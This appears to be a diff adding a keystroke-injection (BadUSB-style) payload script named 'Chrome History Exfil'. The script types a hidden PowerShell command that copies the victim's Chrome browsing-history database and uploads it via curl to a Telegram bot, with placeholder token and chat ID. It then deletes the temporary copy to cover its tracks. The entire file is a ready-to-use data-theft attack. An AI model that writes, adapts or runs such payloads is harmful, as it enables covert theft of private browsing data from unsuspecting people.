@@ -1,0 +1,11 @@
+META windows exfil
+REM Title: Chrome History Exfil
+REM Description: Sends Chrome history database file to Telegram
+REM Edit BOT_TOKEN and CHAT_ID before using
+REM NOTE: Chrome must be closed or the file may be locked
+
+DEFAULTDELAY 400
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "$src='$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History'; $dst='$env:TEMP\ChromeHist'; if(Test-Path $src){Copy-Item $src $dst -Force; curl.exe -s -F 'chat_id=YOUR_CHAT_ID' -F 'document=@'+$dst 'https://api.telegram.org/botYOUR_BOT_TOKEN/sendDocument'; Remove-Item $dst -Force}"
+ENTER
